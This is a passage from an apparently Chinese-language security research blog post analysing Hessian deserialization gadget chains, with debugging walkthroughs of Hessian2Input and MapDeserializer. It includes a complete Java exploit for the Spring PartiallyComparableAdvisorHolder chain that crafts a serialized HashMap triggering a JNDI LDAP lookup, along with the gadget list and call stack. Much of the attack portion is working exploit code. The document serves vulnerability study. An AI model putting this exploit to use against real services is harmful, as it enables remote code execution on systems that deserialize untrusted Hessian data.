&#123;</span><br><span class="line">        <span class="keyword">return</span> findSerializerFactory().readMap(<span class="built_in">this</span>, <span class="literal">null</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">// .....</span></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">if</span> (tag &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">EOFException</span>(<span class="string">&quot;readObject: unexpected end of file&quot;</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">throw</span> error(<span class="string">&quot;readObject: unknown code &quot;</span> + codeName(tag));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行第一条语句</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240123163906.png"></p>
<p>tag为72，对应字符H，进入case ‘H’</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;H&#x27;</span>:</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> findSerializerFactory().readMap(<span class="built_in">this</span>, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先进入findSerializerFactory方法，该方法用于查找适当的序列化工厂（SerializerFactory）对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> SerializerFactory <span class="title function_">findSerializerFactory</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">SerializerFactory</span> <span class="variable">factory</span> <span class="operator">=</span> _serializerFactory;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 创建一个默认的序列化工厂对象</span></span><br><span class="line">        factory = SerializerFactory.createDefault();</span><br><span class="line">        _defaultSerializerFactory = factory;</span><br><span class="line">        _serializerFactory = factory;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> factory;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240123165546.png"></p>
<p>返回至case部分，由于findSerializerFactory()返回的是SerializerFactory对象，所以来到SerializerFactory类的readMap方法，它根据给定的类型字符串（type）获取相应的反序列化器，并使用该反序列化器来读取和解析输入流中的Map数据</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">readMap</span><span class="params">(AbstractHessianInput in, String type)</span></span><br><span class="line">    <span class="keyword">throws</span> HessianProtocolException, IOException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 获取与给定类型对应的反序列化器（Deserializer）对象</span></span><br><span class="line">    <span class="type">Deserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> getDeserializer(type);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 表示已经存在适合解析该类型的反序列化器</span></span><br><span class="line">    <span class="keyword">if</span> (deserializer != <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span> deserializer.readMap(in);</span><br><span class="line">    <span class="comment">// 表示已经存在用于解析HashMap类型的反序列化器</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (_hashMapDeserializer != <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span> _hashMapDeserializer.readMap(in);</span><br><span class="line">    <span class="comment">// 表示还没有适合解析HashMap类型的反序列化器。在这种情况下，创建一个新的MapDeserializer对象，并指定其类型为HashMap.class</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        _hashMapDeserializer = <span class="keyword">new</span> <span class="title class_">MapDeserializer</span>(HashMap.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 读取和解析输入流中的Map数据</span></span><br><span class="line">        <span class="keyword">return</span> _hashMapDeserializer.readMap(in);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240123171918.png"></p>
<p>由于是第一次解析该类型，所以会进入else中实例化一个MapDeserializer对象，该对象用于读取数据，进入MapDeserializer的readMap方法，该方法用于读取和解析Hessian协议中的Map类型数据，并根据指定的类型创建相应的Map对象。然后，循环读取键值对，并将其添加到Map对象中，最后返回解析后的Map对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">readMap</span><span class="params">(AbstractHessianInput in)</span> <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    Map map;</span><br><span class="line">	<span class="comment">// 根据type创建map</span></span><br><span class="line">    <span class="keyword">if</span> (_type == <span class="literal">null</span>)</span><br><span class="line">        map = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (_type.equals(Map.class))</span><br><span class="line">        map = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (_type.equals(SortedMap.class))</span><br><span class="line">        map = <span class="keyword">new</span> <span class="title class_">TreeMap</span>();</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            map = (Map) _ctor.newInstance();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOExceptionWrapper</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 将map对象添加到引用列表中，用于处理循环引用</span></span><br><span class="line">    in.addRef(map);</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 通过调用in.readObject()方法读取键和值，并使用map.put(key, value)方法将键值对添加到map中</span></span><br><span class="line">    <span class="keyword">while</span> (! in.isEnd()) &#123;</span><br><span class="line">        <span class="comment">// 关键点</span></span><br><span class="line">        map.put(in.readObject(), in.readObject());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    in.readEnd();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> map;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据上一步得到的_type和_ctor可以得到这里进入else，并实例化hashmap对象，来到while循环中</p>
<p><strong>进入第一个in.readObject</strong>：</p>
<p>又来到Hessian2Input的readObject方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240123172400.png"></p>
<p>67对应字符’C’，即对象引用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>:</span><br><span class="line">&#123;</span><br><span class="line">    readObjectDefinition(<span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">return</span> readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续进入readObject方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240123172811.png"></p>
<p>进入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x60</span>: <span class="keyword">case</span> <span class="number">0x61</span>: <span class="keyword">case</span> <span class="number">0x62</span>: <span class="keyword">case</span> <span class="number">0x63</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x64</span>: <span class="keyword">case</span> <span class="number">0x65</span>: <span class="keyword">case</span> <span class="number">0x66</span>: <span class="keyword">case</span> <span class="number">0x67</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x68</span>: <span class="keyword">case</span> <span class="number">0x69</span>: <span class="keyword">case</span> <span class="number">0x6a</span>: <span class="keyword">case</span> <span class="number">0x6b</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x6c</span>: <span class="keyword">case</span> <span class="number">0x6d</span>: <span class="keyword">case</span> <span class="number">0x6e</span>: <span class="keyword">case</span> <span class="number">0x6f</span>:</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">ref</span> <span class="operator">=</span> tag - <span class="number">0x60</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_classDefs.size() &lt;= ref)</span><br><span class="line">        <span class="keyword">throw</span> error(<span class="string">&quot;No classes defined at reference &#x27;&quot;</span></span><br><span class="line">                    + Integer.toHexString(tag) + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">ObjectDefinition</span> <span class="variable">def</span> <span class="operator">=</span> _classDefs.get(ref);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> readObjectInstance(<span class="literal">null</span>, def);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该代码片段表示当遇到特定范围的标记时，首先计算引用的索引值，然后根据索引值从类定义表中获取对象定义信息，最后读取和解析一个对象实例，并返回解析后的对象。</p>
<p>执行完这里后就向上返回到了MapDeserializer的readMap方法，<strong>这里第一个readObject得到的应该是EXP中的构造的hashMap的键ObjectBean对象</strong></p>
<p><strong>进入第二个in.readObject</strong>：</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240123173306.png"></p>
<p>进入下面case</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x00</span>: <span class="keyword">case</span> <span class="number">0x01</span>: <span class="keyword">case</span> <span class="number">0x02</span>: <span class="keyword">case</span> <span class="number">0x03</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x04</span>: <span class="keyword">case</span> <span class="number">0x05</span>: <span class="keyword">case</span> <span class="number">0x06</span>: <span class="keyword">case</span> <span class="number">0x07</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x08</span>: <span class="keyword">case</span> <span class="number">0x09</span>: <span class="keyword">case</span> <span class="number">0x0a</span>: <span class="keyword">case</span> <span class="number">0x0b</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x0c</span>: <span class="keyword">case</span> <span class="number">0x0d</span>: <span class="keyword">case</span> <span class="number">0x0e</span>: <span class="keyword">case</span> <span class="number">0x0f</span>:</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">0x10</span>: <span class="keyword">case</span> <span class="number">0x11</span>: <span class="keyword">case</span> <span class="number">0x12</span>: <span class="keyword">case</span> <span class="number">0x13</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x14</span>: <span class="keyword">case</span> <span class="number">0x15</span>: <span class="keyword">case</span> <span class="number">0x16</span>: <span class="keyword">case</span> <span class="number">0x17</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x18</span>: <span class="keyword">case</span> <span class="number">0x19</span>: <span class="keyword">case</span> <span class="number">0x1a</span>: <span class="keyword">case</span> <span class="number">0x1b</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1c</span>: <span class="keyword">case</span> <span class="number">0x1d</span>: <span class="keyword">case</span> <span class="number">0x1e</span>: <span class="keyword">case</span> <span class="number">0x1f</span>:</span><br><span class="line">&#123;</span><br><span class="line">    _isLastChunk = <span class="literal">true</span>;</span><br><span class="line">    _chunkLength = tag - <span class="number">0x00</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    _sbuf.setLength(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    parseString(_sbuf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> _sbuf.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240123173501.png"></p>
<p>很明显得到的是map的值aaaa，<strong>第二个readObject得到的是EXP中构造的hashMap中的值aaaa</strong></p>
<p><strong>map.put</strong>：</p>
<p>回到MapDeserializer的readMap方法，进行map put操作</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240123174156.png"></p>
<p>接下来就是Rome链和JdbcRowSetImpl链了，其实这里不仅仅可以是Rome和JdbcRowSetImpl，只要通过HashMap的hash方法触发的链都可以运用</p>
<h2 id="Spring-PartiallyComparableAdvisorHolder链"><a href="#Spring-PartiallyComparableAdvisorHolder链" class="headerlink" title="Spring PartiallyComparableAdvisorHolder链"></a>Spring PartiallyComparableAdvisorHolder链</h2><h3 id="利用链-2"><a href="#利用链-2" class="headerlink" title="利用链"></a>利用链</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">SimpleJndiBeanFactory.doGetType() (org.springframework.jndi.support)</span><br><span class="line">SimpleJndiBeanFactory.getType() (org.springframework.jndi.support)</span><br><span class="line">BeanFactoryAspectInstanceFactory.getOrder() (org.springframework.aop.aspectj.annotation)</span><br><span class="line">AbstractAspectJAdvice.getOrder (org.springframework.aop.aspectj)</span><br><span class="line">AspectJPointcutAdvisor.getOrder() (org.springframework.aop.aspectj)</span><br><span class="line">AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder.toString() (org.springframework.aop.aspectj.autoproxy)</span><br><span class="line">XString.equals() (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">HotSwappableTargetSource.equals()    (org.springframework.aop.target) <span class="comment">//可忽略</span></span><br><span class="line">HashMap.putVal()</span><br><span class="line">HashMap.put()</span><br><span class="line">MapDeserializer.readMap()</span><br><span class="line">SerializerFactory.readMap()</span><br><span class="line">Hessian2Input.readObject()</span><br></pre></td></tr></table></figure>

<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.dili.hessian;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.logging.impl.NoOpLog;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.AbstractAspectJAdvice;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.AspectInstanceFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.AspectJAroundAdvice;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.AspectJPointcutAdvisor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.annotation.BeanFactoryAspectInstanceFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.jndi.support.SimpleJndiBeanFactory;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PartiallyComparableAdvisorHolderHessian</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// ldap url</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:1389/rtj7ss&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建SimpleJndiBeanFactory</span></span><br><span class="line">        <span class="comment">// String SimpleJndiBeanFactory = &quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;;</span></span><br><span class="line">        <span class="comment">// Object simpleJndiBeanFactory = Class.forName(SimpleJndiBeanFactory).getDeclaredConstructor(new Class[]&#123;&#125;).newInstance();</span></span><br><span class="line">        <span class="type">SimpleJndiBeanFactory</span> <span class="variable">simpleJndiBeanFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleJndiBeanFactory</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 可添加</span></span><br><span class="line">        <span class="comment">// HashSet&lt;String&gt; set = new HashSet&lt;&gt;();</span></span><br><span class="line">        <span class="comment">// set.add(url);</span></span><br><span class="line">        <span class="comment">// setFiled(simpleJndiBeanFactory, &quot;shareableResources&quot;, set);</span></span><br><span class="line">        <span class="comment">// setFiled(simpleJndiBeanFactory.getJndiTemplate(), &quot;logger&quot;, new NoOpLog());</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建BeanFactoryAspectInstanceFactory</span></span><br><span class="line">        <span class="comment">// 触发SimpleJndiBeanFactory的getType方法</span></span><br><span class="line">        <span class="type">AspectInstanceFactory</span> <span class="variable">beanFactoryAspectInstanceFactory</span> <span class="operator">=</span> createWithoutConstructor(BeanFactoryAspectInstanceFactory.class);</span><br><span class="line">        setFiled(beanFactoryAspectInstanceFactory, <span class="string">&quot;beanFactory&quot;</span>, simpleJndiBeanFactory);</span><br><span class="line">        setFiled(beanFactoryAspectInstanceFactory, <span class="string">&quot;name&quot;</span>, url);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建AspectJAroundAdvice</span></span><br><span class="line">        <span class="comment">// 触发BeanFactoryAspectInstanceFactory的getOrder方法</span></span><br><span class="line">        <span class="type">AbstractAspectJAdvice</span> <span class="variable">aspectJAroundAdvice</span> <span class="operator">=</span> createWithoutConstructor(AspectJAroundAdvice.class);</span><br><span class="line">        setFiled(aspectJAroundAdvice, <span class="string">&quot;aspectInstanceFactory&quot;</span>, beanFactoryAspectInstanceFactory);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建AspectJPointcutAdvisor</span></span><br><span class="line">        <span class="comment">// 触发AspectJAroundAdvice的getOrder方法</span></span><br><span class="line">        <span class="type">AspectJPointcutAdvisor</span> <span class="variable">aspectJPointcutAdvisor</span> <span class="operator">=</span> createWithoutConstructor(AspectJPointcutAdvisor.class);</span><br><span class="line">        setFiled(aspectJPointcutAdvisor, <span class="string">&quot;advice&quot;</span>, aspectJAroundAdvice);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建PartiallyComparableAdvisorHolder</span></span><br><span class="line">        <span class="comment">// 触发AspectJPointcutAdvisor的getOrder方法</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">PartiallyComparableAdvisorHolder</span> <span class="operator">=</span> <span class="string">&quot;org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder&quot;</span>;</span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(PartiallyComparableAdvisorHolder);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">partially</span> <span class="operator">=</span> createWithoutConstructor(aClass);</span><br><span class="line">        setFiled(partially, <span class="string">&quot;advisor&quot;</span>, aspectJPointcutAdvisor);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 可以不使用HotSwappableTargetSource</span></span><br><span class="line">        <span class="comment">// 创建HotSwappableTargetSource</span></span><br><span class="line">        <span class="comment">// 触发PartiallyComparableAdvisorHolder的toString方法</span></span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">targetSource1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(partially);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">targetSource2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;aaa&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建HashMap</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(targetSource1, <span class="string">&quot;111&quot;</span>);</span><br><span class="line">        hashMap.put(targetSource2, <span class="string">&quot;222&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;JavaSec/out/PartiallyComparableAdvisorHolderHessian.bin&quot;</span>);</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(fileOutputStream);</span><br><span class="line">        <span class="type">SerializerFactory</span> <span class="variable">serializerFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SerializerFactory</span>();</span><br><span class="line">        serializerFactory.setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        hessian2Output.setSerializerFactory(serializerFactory);</span><br><span class="line">        hessian2Output.writeObject(hashMap);</span><br><span class="line">        hessian2Output.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;JavaSec/out/PartiallyComparableAdvisorHolderHessian.bin&quot;</span>);</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(fileInputStream);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">o</span> <span class="operator">=</span> (HashMap) hessian2Input.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFiled</span><span class="params">(Object o, String fieldname, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(o.getClass(), fieldname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(o, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate )</span></span><br><span class="line">            <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes,</span></span><br><span class="line"><span class="params">                                                Object[] consArgs )</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T) sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span> <span class="params">( <span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">            <span class="keyword">if</span> ( field != <span class="literal">null</span> )</span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( clazz.getSuperclass() != <span class="literal">null</span> )</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> field;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( NoSuchFieldException e ) &#123;</span><br><span class="line">            <span class="keyword">if</span> ( !clazz.getSuperclass().equals(Object.class) ) &#123;</span><br><span class="line">                <span class="keyword">return</span> getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="函数调用栈-1"><a href="#函数调用栈-1" class="headerlink" title="函数调用栈"></a>函数调用栈</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">lookup:<span class="number">417</span>, InitialContext (javax.naming)</span><br><span class="line">doInContext:<span class="number">155</span>, JndiTemplate$<span class="number">1</span> (org.springframework.jndi)</span><br><span class="line">execute:<span class="number">87</span>, JndiTemplate (org.springframework.jndi)</span><br><span class="line">lookup:<span class="number">152</span>, JndiTemplate (org.springframework.jndi)</span><br><span class="line">lookup:<span class="number">179</span>, JndiTemplate (org.springframework.jndi)</span><br><span class="line">lookup:<span class="number">95</span>, JndiLocatorSupport (org.springframework.jndi)</span><br><span class="line">doGetType:<span class="number">228</span>, SimpleJndiBeanFactory (org.springframework.jndi.support)</span><br><span class="line">getType:<span class="number">184</span>, SimpleJndiBeanFactory (org.springframework.jndi.support)</span><br><span class="line">getOrder:<span class="number">136</span>, BeanFactoryAspectInstanceFactory (org.springframework.aop.aspectj.annotation)</span><br><span class="line">getOrder:<span class="number">223</span>, AbstractAspectJAdvice (org.springframework.aop.aspectj)</span><br><span class="line">getOrder:<span class="number">81</span>, AspectJPointcutAdvisor (org.springframework.aop.aspectj)</span><br><span class="line">toString:<span class="number">151</span>, AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder (org.springframework.aop.aspectj.autoproxy)</span><br><span class="line">equals:<span class="number">392</span>, XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">equals:<span class="number">104</span>, HotSwappableTargetSource (org.springframework.aop.target)</span><br><span class="line">putVal:<span class="number">634</span>, HashMap (java.util)</span><br><span class="line">put:<span class="number">611</span>, HashMap (java.util)</span><br><span class="line">readMap:<span class="number">114</span>, MapDeserializer (com.caucho.hessian.io)</span><br><span class="line">readMap:<span class="number">538</span>, SerializerFactory (com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">2110</span>, Hessian2Input (com.caucho.hessian.io)</span><br><span class="line">main:<span class="number">79</span>, PartiallyComparableAdvisorHolderHessian (org.dili.hessian)</span><br></pre></td></tr></table></figure>

<h3 id="详细分析-1"><a href="#详细分析-1" class="headerlink" title="详细分析"></a>详细分析</h3><p><strong>第一步</strong></p>
<p>还是从Hessian2Input类的readObject方法开始，开始tag为72，Map对象，进入对应的case处理；根据findSerializerFactory()方法找到SerializerFactory类，调用其readMap方法</p>
<p>进入SerializerFactory的readMap方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240202180834.png"></p>
<p>进入MapDeserializer的readMap方法，会来到while循环</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (! in.isEnd()) &#123;</span><br><span class="line">    map.put(in.readObject(), in.readObject());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行完一轮后的结果，将第一个元素写入map中</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240202204812.png"></p>
<p>接着第二轮put操作中</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240202211211.png"></p>
<p><strong>第二步</strong></p>
<p>进入putVal方法，在HashMap中的putVal的方法中，会将put元素的键与map中已有元素的键进行对比，即equals操作</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240202212212.png"></p>
<p>这里的key为exp中第二次put的键，k为exp中第一次put的键</p>
<p><strong>第三步</strong></p>
<p>进入HotSwappableTargetSource的equals方法中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object other)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span> == other || other <span class="keyword">instanceof</span> HotSwappableTargetSource &amp;&amp; <span class="built_in">this</span>.target.equals(((HotSwappableTargetSource)other).target);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用target参数中的equals方法，这就是在exp中设置target属性的原因</p>
